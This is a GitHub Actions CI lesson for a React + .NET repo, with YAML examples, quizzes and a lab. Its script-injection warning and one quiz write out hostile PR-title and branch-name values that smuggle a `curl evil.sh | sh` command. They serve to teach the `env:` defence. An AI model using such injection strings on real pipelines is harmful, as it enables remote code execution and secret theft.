---
id: pro-01
title: CI with GitHub Actions
level: intermediate
minutes: 60
xp: 150
summary: Build, lint and test a React + .NET repo on every push — triggers, matrices, caching, artifacts, secrets, environments and reusable workflows.
---

**Continuous Integration (CI)** means every change is built and tested automatically, on a clean
machine, before it is merged. "It works on my machine" stops being an argument: either the
pipeline is green or it isn't. At almost every job you'll join, the CI pipeline is the gatekeeper
for `main` — and sooner or later you'll be the one who has to fix it, speed it up or extend it.

GitHub Actions is the CI system built into GitHub. Pipelines are YAML files in
`.github/workflows/`, versioned with the code, reviewed in pull requests like any other change.

This lesson is about the **integration** half: build, test and gate every change. The deploy job
you'll see below is deliberately a stub (`./scripts/deploy.sh`). What goes *inside* a safe
deploy — rolling, blue-green and canary releases, database migrations in the pipeline, rollback,
promoting one build through environments, versioning — is the topic of **Shipping Safely**, later
in this track. *Which* tests the pipeline should run (and which to leave out) is covered in
**Testing Strategy**.

The examples use a repo with a `web/` (Vite + React) and an `api/` (ASP.NET Core) folder: the
same layout as **BranchStory**, the app you build in the Capstone track. Its **Quality Gates**
lesson grows this pipeline into the real thing for that app.

## The mental model

| Concept | What it is | Example |
|---|---|---|
| **Workflow** | One YAML file in `.github/workflows/`. Has triggers and jobs. | `ci.yml` |
| **Event / trigger** | What starts the workflow. | `push`, `pull_request`, `schedule`, `workflow_dispatch` |
| **Job** | A set of steps that runs on **one fresh runner** (VM or container). Jobs run **in parallel** by default. | `frontend`, `backend` |
| **Step** | One command (`run:`) or one reusable action (`uses:`). Steps in a job run **sequentially** and share the file system. | `npm ci`, `actions/checkout@v5` |
| **Runner** | The machine. GitHub-hosted (`ubuntu-latest`, `windows-latest`, `macos-latest`) or self-hosted. | `runs-on: ubuntu-latest` |
| **Action** | A reusable step published in a repo (JS, Docker or composite). | `actions/setup-node@v5` |

Two consequences people trip over:

1. **Jobs don't share files.** Each job starts on a brand-new machine with an empty disk — it doesn't
   even have your code until a step runs `actions/checkout`. If job B needs the build output of job A,
   A must upload it as an **artifact** and B must download it (and B must declare `needs: A`).
2. **Steps do share files** — a `run: npm ci` in step 3 leaves `node_modules` for step 4.

**`needs:`** turns parallel jobs into a pipeline: `needs: [frontend, backend]` waits for both. If a
needed job fails, the dependent job is **skipped** (not failed) unless it has an `if:` like `always()`.

## Your first workflow

Here's a realistic `ci.yml` for a monorepo with `web/` (Vite + React + TS) and `api/`
(ASP.NET Core 10 + xUnit). Read it top to bottom — every line is explained below.

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:            # every PR targeting any branch
  workflow_dispatch:       # adds a "Run workflow" button in the Actions tab

# Cancel an older run of the same PR when a new commit arrives (PRs only, never main).
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

# Least privilege for the automatic GITHUB_TOKEN.
permissions:
  contents: read

jobs:
  frontend:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    defaults:
      run:
        working-directory: web
    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-node@v5
        with:
          node-version: 24
          cache: npm
          cache-dependency-path: web/package-lock.json

      - run: npm ci                 # exact install from the lockfile
      - run: npm run lint           # eslint
      - run: npx tsc -b             # type-check (Vite itself does not type-check!)
      - run: npm test -- --run      # vitest, single run (no watch mode)
      - run: npx vite build         # → web/dist

      - uses: actions/upload-artifact@v4
        with:
          name: web-dist
          path: web/dist
          retention-days: 7

  backend:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    defaults:
      run:
        working-directory: api      # the .slnx lives here, so dotnet finds it
    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-dotnet@v5
        with:
          dotnet-version: '10.0.x'
          cache: true                                   # caches ~/.nuget/packages
          cache-dependency-path: 'api/**/packages.lock.json'

      - run: dotnet restore --locked-mode
      - run: dotnet build --no-restore -c Release
      - run: dotnet test --no-build -c Release --logger trx --results-directory TestResults

      - uses: actions/upload-artifact@v4
        if: always()                # upload test results even if tests failed
        with:
          name: test-results
          path: api/TestResults     # `uses:` paths ignore working-directory
```

Line by line, the important bits:

- **`on:`** — `push` to `main` (after merge) *and* `pull_request` (before merge). Running on both
  is the norm: PR runs gate the merge, `main` runs prove the merged result is still green.
- **`concurrency`** — if you push three commits to a PR quickly, only the last run survives. Saves
  minutes (= money on private repos) and queue time. Only cancel PR runs: on `main` a CI run that has started should
  finish (so you know which merge broke it), and a deploy job in the same
  workflow should never be cancelled halfway. A running `main` run is then never cancelled; the
  next one waits for it. (GitHub keeps at most one *pending* run per group, so a waiting run can
  still be replaced by a newer one — but nothing is killed mid-way.)
- **`permissions`** — every job gets a short-lived `GITHUB_TOKEN`. Default it to read-only and
  grant more per job only when needed (e.g. `packages: write` to push an image).
- **`defaults: run: working-directory`** — every `run:` step of the job starts in that folder.
  It does **not** affect `uses:` steps, whose paths (`path:`, `cache-dependency-path:`) stay
  relative to the repository root — hence `web/dist` and `api/TestResults`.
- **`npm ci`** not `npm install` — `ci` deletes `node_modules`, installs *exactly* what
  `package-lock.json` says and fails if the lockfile is out of sync with `package.json`.
- **`npx tsc -b`** — Vite strips types (via Oxc/esbuild) and never reports type errors. If CI
  doesn't run `tsc`, broken types reach `main`. Why `-b` and not the classic `tsc --noEmit`? The
  Vite React-TS template's root `tsconfig.json` is a *solution file*: `"files": []` plus
  `references` to `tsconfig.app.json` and `tsconfig.node.json`. Plain `tsc --noEmit` on it checks
  **zero files** and passes every time; `tsc -b` (build mode) follows the references, and those
  configs already set `noEmit`. In a project with a single ordinary `tsconfig.json`,
  `tsc --noEmit` is fine.
- **`npx vite build`** — the template's `npm run build` is `tsc -b && vite build`; since we
  type-check in its own step (clearer failure message), we call Vite directly.
- **`--run`** for Vitest — Vitest starts in watch mode in an interactive terminal. It already
  detects CI (GitHub sets `CI=true`) and runs once, but `--run` makes the intent explicit and
  keeps the same script safe on other CI systems and in local pre-push hooks.
- **`--locked-mode`** — the .NET equivalent of `npm ci`. Requires
  `<RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>` in your `Directory.Build.props`
  so `packages.lock.json` files exist.
- **`--no-restore` / `--no-build`** — don't repeat work the previous step already did.
- **`if: always()`** — steps normally stop at the first failure. `always()` runs this one anyway,
  so you can download the `.trx` file and see *which* tests failed.
- **`timeout-minutes`** — the default is 360 minutes. A hung test should not burn six hours.

:::job title="What you'll find on day one"
Most repos already have a `ci.yml`. Read it in your first week: it is the most honest
documentation of how the project is built, which Node/.NET versions are used and which checks
must pass. If the README and the workflow disagree, the workflow is right.
:::

:::quiz id=pro-01-q1 xp=10
Job `deploy` needs the `web/dist` folder that job `frontend` built. What's the correct setup?
- [ ] Nothing — jobs in the same workflow share a workspace
- [ ] Run both jobs on `ubuntu-latest` so they land on the same machine
- [x] `frontend` uploads `web/dist` as an artifact; `deploy` declares `needs: frontend` and downloads it
- [ ] Put `web/dist` in the cache with `actions/cache`
> Every job gets a fresh runner — even two jobs on `ubuntu-latest` are two different VMs, so there is no shared workspace. Artifacts are the way to pass build outputs between jobs; `needs:` makes `deploy` wait for `frontend` (without it both would start at once and there'd be nothing to download yet). The cache is tempting but wrong: it's a best-effort speed-up for *dependencies* that may be evicted at any time, so never rely on it for correctness.
:::

## Triggers in depth

```yaml
on:
  pull_request:
    branches: [main]
    paths:                       # only run when these change
      - 'web/**'
      - '.github/workflows/web.yml'
  push:
    branches: [main, 'release/**']
    tags: ['v*']                 # v1.2.3 → release pipeline
  schedule:
    - cron: '0 3 * * 1'          # Mondays 03:00 UTC — nightly/weekly jobs
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
        default: staging
```

- **`paths` filters** make monorepos fast: the frontend workflow doesn't run when only C# changed.
  Careful — if a path-filtered workflow is a *required* check and it doesn't run, the PR waits
  forever ("Expected — Waiting for status to be reported"). Common fix: one always-running workflow
  whose jobs skip themselves when their folder didn't change (e.g. with `dorny/paths-filter`), plus
  an aggregate "ci-ok" job (shown under *Required status checks* below).
- **`schedule`** uses UTC cron and runs on the default branch. Great for dependency audits,
  nightly E2E suites and cleanup jobs.
- **`workflow_dispatch`** = manual button with typed inputs, read via `${{ inputs.environment }}`.
- **`pull_request` from forks** runs with a read-only token and **no secrets** — on purpose, so a
  stranger's PR can't exfiltrate them. Avoid `pull_request_target` unless you really understand
  it: it runs with secrets in the context of the base repo, and checking out the PR's code in it
  is a classic supply-chain hole.
- **Dependabot PRs** are treated like fork PRs too: they don't see your Actions secrets (only
  secrets stored separately under *Dependabot secrets*). A CI step that needs a secret will fail on
  every Dependabot PR — a classic first-week puzzle.

## Expressions, conditions and outputs

`${{ … }}` is the expression syntax. GitHub evaluates it **before** the step runs and pastes the
result into the YAML as text — remember that, it matters for security below. The data comes from
**contexts** (`github`, `env`, `vars`, `secrets`, `steps`, `needs`, `matrix`, `inputs`, `runner`).
You'll use a handful constantly:

```yaml
steps:
  - run: echo "Branch ${{ github.ref_name }}, commit ${{ github.sha }}, actor ${{ github.actor }}"

  - name: Only on main
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    run: echo "deploying"

  - name: Compute a version
    id: version
    run: echo "value=1.4.${{ github.run_number }}" >> "$GITHUB_OUTPUT"

  - run: echo "Version is ${{ steps.version.outputs.value }}"

  - name: Set an env var for later steps
    run: echo "BUILD_TIME=$(date -u +%FT%TZ)" >> "$GITHUB_ENV"

  - name: Write a summary shown on the run page
    run: echo "### Built version ${{ steps.version.outputs.value }} :rocket:" >> "$GITHUB_STEP_SUMMARY"
```

How the pieces fit: a step with an `id` can write `name=value` lines to the file named by
`$GITHUB_OUTPUT`; later steps read them as `steps.<id>.outputs.<name>`. Lines written to
`$GITHUB_ENV` become environment variables for all *later* steps (not the current one). Both only
live inside the job — to hand a value to another job, declare job `outputs:` and read
`needs.<job>.outputs.<name>`.

Status functions for `if:` — `success()` (default), `failure()` (only if something before
failed — perfect for "post to Slack on failure"), `always()`, `cancelled()`. Note that `if:` is
already an expression, so `if: github.ref == 'refs/heads/main'` needs no `${{ }}`.

:::warn title="Script injection"
Never interpolate untrusted input straight into `run:`. Because `${{ }}` is pasted in *before* the
shell sees the script, a PR titled `"; curl evil.sh | sh; echo "` turns
`run: echo "${{ github.event.pull_request.title }}"` into three commands. Untrusted means anything
an outsider can type: PR/issue titles and bodies, branch names, commit messages, comment text,
`workflow_dispatch` inputs. Pass it through an environment variable instead — the shell then
treats it as data:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```
:::

:::quiz id=pro-01-q5 xp=10
An attacker opens a PR from a branch they named themselves (branch names may contain `"`, `'`, `;`,
`$`, `|` — for example `x";curl${IFS}evil.sh|sh;"`). Which step is safe **whatever** the branch name
contains?

- [ ] `run: echo "Building ${{ github.head_ref }}"`
- [ ] `run: echo 'Building ${{ github.head_ref }}'`
- [x] `env: { BRANCH: "${{ github.head_ref }}" }` and `run: echo "Building $BRANCH"`
- [ ] `run: echo "Building ${{ toJSON(github.head_ref) }}"`
> With `env:`, the value reaches the shell as a variable and `"$BRANCH"` is expanded as data, never parsed as code. Every other option pastes the text into the script *before* bash runs: double quotes are closed by the `"` in the name, single quotes are closed by a `'` (branch names may contain one), and `toJSON` only adds JSON quoting, which a crafted value can still break out of.
:::

## Matrix builds

A **matrix** runs the same job for every combination of values — e.g. test on several OSes or
runtime versions without copy-pasting the job.

```yaml
jobs:
  test:
    strategy:
      fail-fast: false               # let the other combinations finish when one fails
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [22, 24]
        include:
          - os: ubuntu-latest
            node: 24
            coverage: true           # extra variable on one combination only
        exclude:
          - os: windows-latest
            node: 22
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with:
          node-version: ${{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm test -- --run ${{ matrix.coverage && '--coverage' || '' }}
```

2 OS × 2 Node = 4, minus 1 excluded = **3 jobs**. `include` with values that match an existing
combination just adds variables to it; an `include` entry matching nothing adds a new job.

:::pro
Applications (as opposed to libraries) rarely need a big matrix — you deploy to *one* runtime.
Teams use matrices for: libraries supporting several versions, **test sharding**
(`shard: [1, 2, 3, 4]` → `npx playwright test --shard=${{ matrix.shard }}/4`), and multi-arch
Docker builds. Don't multiply your CI bill for combinations you never ship.
:::

:::quiz id=pro-01-q2 xp=10
`os: [ubuntu-latest, windows-latest, macos-latest]`, `dotnet: ['8.0.x', '10.0.x']`, no
include/exclude. How many jobs, and what does `fail-fast: true` (the default) do?
- [ ] 5 jobs; failures are retried
- [x] 6 jobs; when one fails, the remaining in-progress/queued ones are cancelled
- [ ] 6 jobs; the workflow stops before starting any job if the YAML has errors
- [ ] 3 jobs; each runs both SDK versions sequentially
> 3 × 2 = 6 combinations, each its own job on its own runner (a matrix never runs values sequentially inside one job). `fail-fast: true` cancels the rest of the matrix as soon as one combination fails — fast feedback, but you lose the information "does it fail everywhere or only on Windows?". It has nothing to do with retries or YAML validation. Set `fail-fast: false` when you want the full picture.
:::

## Caching: make CI fast

Most CI time is spent downloading dependencies. Caching stores a folder keyed by a hash of your
lockfile and restores it on the next run.

**npm** — `setup-node` does it for you with `cache: npm` (also `pnpm`, `yarn`). It caches npm's
download cache (`~/.npm`), *not* `node_modules`, so `npm ci` still runs but is much faster.

**NuGet** — `setup-dotnet` with `cache: true` needs `packages.lock.json`. Without lockfiles, use
`actions/cache` directly:

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.nuget/packages
    key: nuget-${{ runner.os }}-${{ hashFiles('**/*.csproj', '**/Directory.Packages.props') }}
    restore-keys: |
      nuget-${{ runner.os }}-
```

- **`key`** — exact match restores the cache and skips saving at the end.
- **`restore-keys`** — prefix fallbacks: if the exact key misses, restore the most recent cache
  starting with `nuget-Linux-` (better than nothing), and save a new one under the full key.
- Caches are scoped per branch with fallback to the default branch (a PR can read `main`'s
  cache, but `main` never sees a PR's cache), and evicted after 7 days unused or when the repo
  exceeds its cache quota.
- Common mistake: keying on something that changes every run (`github.sha`, a timestamp) — the
  key never matches, so you pay to upload a new cache each run and never get an exact hit.

Other things worth caching: Playwright browsers (`~/.cache/ms-playwright`), Docker layers
(`docker/build-push-action` with `cache-from: type=gha`), and tool caches like Turborepo/Nx.

:::quiz id=pro-01-q3 xp=10
Which of these are good uses of the cache? (select all that apply)
- [x] `~/.npm`, keyed on `hashFiles('**/package-lock.json')`
- [x] `~/.nuget/packages`, keyed on the hash of `packages.lock.json` files
- [ ] The `dist/` folder, so the deploy job can pick it up
- [ ] A `.env` file with secrets, so you don't need GitHub Secrets
> Caches are for re-downloadable dependencies keyed by lockfile hash — if the cache is missing, the job is just slower, not wrong. `dist/` for a deploy job is tempting, but a cache can be evicted or come from a different commit's run; build outputs passed between jobs belong in **artifacts** (guaranteed, scoped to the run). And caches are readable by other workflows and branches on the repo (including PR runs) — never put secrets in them.
:::

## Artifacts

Artifacts are files a run keeps after it finishes: build outputs, test reports, coverage,
Playwright traces, screenshots of failing E2E tests.

```yaml
  e2e:
    needs: frontend                  # wait for the build, then reuse its output
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: web
    steps:
      - uses: actions/checkout@v5    # the tests and playwright.config.ts live in the repo
      - uses: actions/setup-node@v5
        with:
          node-version: 24
          cache: npm
          cache-dependency-path: web/package-lock.json
      - run: npm ci                  # installs @playwright/test from the lockfile
      - uses: actions/download-artifact@v5
        with:
          name: web-dist
          path: web/dist             # the exact bundle the frontend job built
      - run: npx playwright install --with-deps chromium
      - run: npx playwright test     # webServer in playwright.config.ts runs `vite preview` on dist
      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: playwright-report
          path: web/playwright-report
```

Three things to notice: the job still needs `checkout` and `npm ci` (a fresh runner has neither
your code nor `node_modules`), it *downloads* the bundle instead of rebuilding it, and
`upload-artifact` paths are relative to the workspace root — `working-directory` only applies to
`run:` steps, so the path is `web/playwright-report`.

Upload traces **only on failure** (`if: failure()`) — when the suite is green nobody looks at them.
Artifacts expire (90 days by default, configurable with `retention-days`) and count against your
storage quota.

## Required status checks & branch protection

CI is only a gate if GitHub enforces it. In **Settings → Branches / Rulesets** for `main`:

- **Require a pull request before merging** (+ at least one approval).
- **Require status checks to pass** — pick the *job names* (`frontend`, `backend`) as required.
- **Require branches to be up to date** — or better at scale, a **merge queue**, which tests the
  PR *combined with* the latest `main` before merging so two green PRs can't make a red `main`.

:::warn
Required checks are matched by **job name** (for matrix jobs: name + values, e.g.
`test (ubuntu-latest, 24)`). Renaming a job or changing the matrix silently creates a *new* check
name, and PRs wait forever for the old one. Keep job names stable, or add a single aggregate job
that `needs:` all others and make only that one required.
:::

The aggregate job has one trap: a **skipped** job counts as *passing* for branch protection. If
`frontend` fails, a plain `needs: [frontend, backend]` job is skipped — and the PR becomes
mergeable. So the aggregate job must always run and fail explicitly:

```yaml
  ci-ok:
    if: always()                       # run even when a needed job failed
    needs: [frontend, backend, e2e]
    runs-on: ubuntu-latest
    steps:
      - name: Fail if any needed job failed or was cancelled
        if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
        run: exit 1
```

`needs.*.result` is the list of results (`success`, `failure`, `cancelled`, `skipped`) of all
needed jobs. Make **only** `ci-ok` required; you can now add, rename or matrix jobs freely.

## Secrets & environments

**Secrets** are encrypted values (API keys, deploy tokens) stored in the repo/org settings and
injected at runtime. They're masked as `***` in logs — but masking is a string match on the exact
value, so a secret that is base64-encoded, split or otherwise transformed by your script appears
in clear text. Treat masking as a safety net, not a reason to `echo` secrets. Secrets are referenced
through `${{ secrets.NAME }}`; hand them to scripts via `env:`, like any other value.

```yaml
jobs:
  deploy:
    needs: [frontend, backend]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    permissions:
      contents: read
      id-token: write            # for OIDC login to the cloud — no long-lived keys
    steps:
      - uses: actions/checkout@v5              # deploy.sh lives in the repo
      - uses: actions/download-artifact@v5
        with: { name: web-dist, path: dist }
      - name: Deploy
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          API_URL: ${{ vars.API_URL }}          # non-secret configuration variable
        run: ./scripts/deploy.sh
```

- **`secrets.X`** — encrypted, masked. **`vars.X`** — plain configuration variables (URLs,
  feature switches), visible in logs. Don't put secrets in `vars`.
- **Environments** (`staging`, `production`) carry their *own* secrets and variables and can have
  **protection rules**: required reviewers ("a human clicks Approve before prod"), wait timers,
  and "only branch `main` may deploy here". The same `secrets.DEPLOY_TOKEN` resolves to a different
  value per environment.
- **OIDC** (`id-token: write`) lets the job exchange a short-lived GitHub-signed token for cloud
  credentials (Azure `azure/login`, AWS `configure-aws-credentials`). No cloud keys stored in
  GitHub at all — this is what security-minded teams use today.
- Secrets are **not** passed to workflows triggered by forked PRs, and not to reusable workflows
  unless you pass them explicitly (or use `secrets: inherit`, which only works when caller and
  called workflow are in the same organization or enterprise).

:::info title="What's inside deploy.sh?"
Here the deploy step is a placeholder on purpose: this lesson is about getting a trustworthy build
*to* that step. Building the step itself (OIDC login, deploying the same artifact to staging and
then production, running migrations, canary rollout and rollback) is the **Shipping Safely**
lesson later in this track.
:::

:::quiz id=pro-01-q6 xp=15
Spot the bug. The `deploy` job fails with `./scripts/deploy.sh: No such file or directory`,
although the script is committed and executable.

```yaml
deploy:
  needs: [frontend, backend]
  runs-on: ubuntu-latest
  steps:
    - uses: actions/download-artifact@v5
      with: { name: web-dist, path: dist }
    - run: ./scripts/deploy.sh
```

- [ ] `needs:` must list only one job
- [ ] The artifact overwrote the `scripts/` folder
- [x] The job never runs `actions/checkout`, so the repository isn't on this runner
- [ ] Scripts must be called with `bash scripts/deploy.sh` on GitHub runners
> A job's runner starts with an empty workspace — not even your repo is there until `actions/checkout` runs. `download-artifact` only adds the `dist/` folder. `needs:` can list several jobs, and `./script.sh` works fine on Linux runners when the file is committed with the executable bit (`git update-index --chmod=+x`). Add a checkout step.
:::

## Reusable workflows & composite actions

Five repos with copy-pasted 120-line workflows drift apart within a month. Two ways to share:

**Reusable workflow** — a whole workflow called like a function (`on: workflow_call`):

```yaml
# .github/workflows/dotnet-ci.yml  (in a shared repo, e.g. my-org/ci-templates)
name: dotnet-ci
on:
  workflow_call:
    inputs:
      project:
        type: string
        required: true
      dotnet-version:
        type: string
        default: '10.0.x'
    secrets:
      NUGET_TOKEN:
        required: false
jobs:
  build-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-dotnet@v5
        with:
          dotnet-version: ${{ inputs.dotnet-version }}
      - run: dotnet test ${{ inputs.project }} -c Release
```

```yaml
# caller: .github/workflows/ci.yml in each service repo
jobs:
  api:
    uses: my-org/ci-templates/.github/workflows/dotnet-ci.yml@v1
    with:
      project: api/Api.slnx            # .NET 10's `dotnet new sln` creates .slnx by default
    secrets: inherit
```

The caller's job has no `runs-on` or `steps` — the called workflow brings its own. `@v1` pins
the template repo to a tag, so template changes roll out only when callers bump the version.

**Composite action** — a reusable bundle of *steps* (`action.yml` with `runs: using: composite`),
used inside a job like any other `uses:`. Good for "setup-node + npm ci" boilerplate:

```yaml
# .github/actions/setup-web/action.yml
name: setup-web
description: Install Node and web dependencies
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v5
      with:
        node-version: 24
        cache: npm
        cache-dependency-path: web/package-lock.json
    - run: npm ci
      shell: bash                     # composite run steps must declare a shell
      working-directory: web
```

Used as `- uses: ./.github/actions/setup-web` *after* `actions/checkout` (a local action is a
file in the repo, so the repo must be checked out first).

Rule of thumb: composite action = shared steps; reusable workflow = shared jobs (with their own
runners, environments and secrets).

:::pro title="Supply-chain hygiene"
`uses: some-person/cool-action@v2` runs someone else's code with your token. Senior teams pin
third-party actions to a **full commit SHA** (`@8f4b7f8…  # v2.1.0`), let Dependabot bump them
(`package-ecosystem: github-actions`), and keep `permissions:` minimal. First-party `actions/*`
on a major tag is a common, accepted compromise.
:::

:::quiz id=pro-01-q4 xp=10
Your required check `test` became `test (ubuntu-latest)` after you added a matrix, and every PR
is now stuck on "Expected — Waiting for status to be reported". Best fix?
- [ ] Remove branch protection
- [ ] Re-run the workflow until GitHub notices
- [x] Update the required checks (or add one stable aggregate job that `needs:` the matrix and make that required)
- [ ] Add `fail-fast: false`
> Required checks are matched by name, and no job called plain `test` exists anymore, so that check will never report — re-running produces `test (ubuntu-latest)` again. `fail-fast` only affects cancellation inside the matrix, and removing branch protection "fixes" it by removing the gate. Point the required check at the new name, or better, at an aggregate `ci-ok` job (with `if: always()`) whose stable name decouples branch protection from your job layout.
:::

## Debugging a red pipeline

1. Open the failing job and expand the failing step — read the **first** error, not the last.
2. Reproduce locally with the *same command* (`npm ci && npm test -- --run`). Most "CI only"
   failures are: different Node/.NET version, a missing env var, case-sensitive paths on Linux
   (`import './Button'` vs `button.tsx` works on macOS/Windows, fails on Linux), timezone/locale,
   or a test depending on order or on the network.
3. Re-run with **debug logging** (re-run → "Enable debug logging", or set the secret/variable
   `ACTIONS_STEP_DEBUG=true`; `ACTIONS_RUNNER_DEBUG=true` adds runner diagnostics).
4. Flaky test? Don't just hit re-run forever — quarantine it and open an issue. Flakiness erodes
   trust in CI until people ignore red.
5. Tools like `act` can run workflows locally in Docker — handy for YAML iteration, not perfect.

:::lab id=pro-01-lab1 xp=100
title: A real CI pipeline for a full-stack repo
Create (or reuse) a GitHub repo with a Vite React-TS app in `web/` and an ASP.NET Core API with an
xUnit test project in `api/`:

```bash
npm create vite@latest web -- --template react-ts
cd web && npm i && npm i -D vitest && cd ..
mkdir api && cd api
dotnet new sln -n Api
dotnet new webapi -n Api.Web
dotnet new xunit -n Api.Tests
dotnet sln add Api.Web Api.Tests
dotnet add Api.Tests reference Api.Web
cd ..
```

Add `"test": "vitest"` to `web/package.json` scripts and one trivial test:

```ts
// web/src/sum.test.ts
import { test, expect } from 'vitest'

test('adds', () => {
  expect(1 + 1).toBe(2)
})
```

Check it locally first — `cd web && npm test -- --run` should print `1 passed`, and `npx tsc -b`
should print nothing (no output = no type errors).

Turn on NuGet lockfiles **before** you write the workflow. Create `api/Directory.Build.props`:

```xml
<Project>
  <PropertyGroup>
    <RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>
  </PropertyGroup>
</Project>
```

Then run `cd api && dotnet restore` and commit the generated `packages.lock.json` files (one per
project). The workflow needs them twice: `setup-dotnet` with `cache: true` fails the job when no
file matches `api/**/packages.lock.json`, and `dotnet restore --locked-mode` fails without a
lockfile to check against. Skip this step and your first PR goes red for a reason that has nothing
to do with your code.

Then write `.github/workflows/ci.yml` with two jobs, `frontend` and `backend`, based on the
example in this lesson (it already uses `working-directory: web` and `api`). Push to a branch
and open a PR. On the PR page you should see the checks `CI / frontend` and `CI / backend` go
from yellow to green.

Then make it fail on purpose: change the test to `toBe(3)`, push, watch the PR go red (the log
shows `expected 2 to be 3`), revert.

- [ ] `ci.yml` runs on `pull_request` and on `push` to `main`, with `concurrency` and `permissions: contents: read`
- [ ] The `frontend` job runs `npm ci`, lint, `tsc -b`, `vitest --run` and `vite build`, with npm caching
- [ ] `api/Directory.Build.props` enables lockfiles and the `packages.lock.json` files are committed
- [ ] The `backend` job runs `dotnet restore --locked-mode`, `build` and `test` on .NET 10 with NuGet caching
- [ ] `web/dist` is uploaded as an artifact and downloadable from the run page
- [ ] A deliberately broken test turned the PR red, and fixing it turned it green
- [ ] In branch protection / rulesets, `frontend` and `backend` are required checks for `main`
- [ ] (Bonus) The second run is visibly faster thanks to the cache ("Cache restored from key …" in the log)
:::

:::cards id=pro-01-cards1 xp=15 title="GitHub Actions"
Q: Workflow vs job vs step?
A: Workflow = YAML file with triggers. Job = steps on one fresh runner (jobs run in parallel). Step = one command or action (sequential, shared file system).
Q: How do you pass files between jobs?
A: upload-artifact in the producing job, `needs:` + download-artifact in the consuming job.
Q: Cache vs artifact?
A: Cache = best-effort speed-up for dependencies, keyed by lockfile hash. Artifact = guaranteed output of a run (builds, reports).
Q: Why `npm ci` instead of `npm install` in CI?
A: Clean, exact install from the lockfile; fails if package.json and the lockfile disagree.
Q: What does `concurrency` with `cancel-in-progress: true` do?
A: Cancels older runs in the same group (e.g. same branch) when a new one starts. Limit it to PRs (`${{ github.event_name == 'pull_request' }}`) so runs and deploys on `main` always finish.
Q: secrets vs vars?
A: `secrets.X` are encrypted and masked in logs; `vars.X` are plain configuration values.
Q: What are environments for?
A: Per-stage secrets/variables plus protection rules (required reviewers, branch restrictions, wait timers).
Q: Why use OIDC for cloud deploys?
A: The job gets short-lived cloud credentials from a GitHub-signed token — no long-lived keys stored as secrets.
Q: Reusable workflow vs composite action?
A: Reusable workflow (`workflow_call`) shares whole jobs; composite action shares a sequence of steps inside a job.
Q: Why do forked PRs not see secrets?
A: So untrusted code can't exfiltrate them. Avoid `pull_request_target` + checking out PR code.
Q: How do you avoid script injection in `run:`?
A: Pass untrusted `${{ }}` values via `env:` and reference them as shell variables.
Q: Why might a Vite build pass in CI with type errors?
A: Vite only strips types; you need a separate type-check step — `tsc -b` for the Vite template's project references (plain `tsc --noEmit` on a `"files": []` solution config checks nothing).
Q: Why must an aggregate `ci-ok` job use `if: always()`?
A: Otherwise it's skipped when a needed job fails, and branch protection treats a skipped required check as passing.
:::

## Recap

- A workflow = triggers + jobs; jobs run in parallel on fresh runners, steps run in order and share files.
- Run CI on `pull_request` *and* `push` to `main`; add `concurrency`, minimal `permissions` and `timeout-minutes`.
- Frontend: `npm ci`, lint, `tsc -b` (or `tsc --noEmit` without project references), `vitest --run`, `vite build`. Backend: `dotnet restore --locked-mode`, `build`, `test`.
- Never paste untrusted `${{ }}` values into `run:` — pass them via `env:`.
- Cache dependencies (keyed by lockfile hash); pass build outputs with artifacts.
- Matrices multiply jobs — use them for versions, OSes and test sharding, not by default.
- Branch protection + required checks make CI a real gate; keep check names stable with an `if: always()` aggregate job.
- Secrets in `secrets`, config in `vars`, per-stage values and approvals in environments, OIDC for cloud credentials.
- Share pipelines with reusable workflows and composite actions; pin third-party actions.
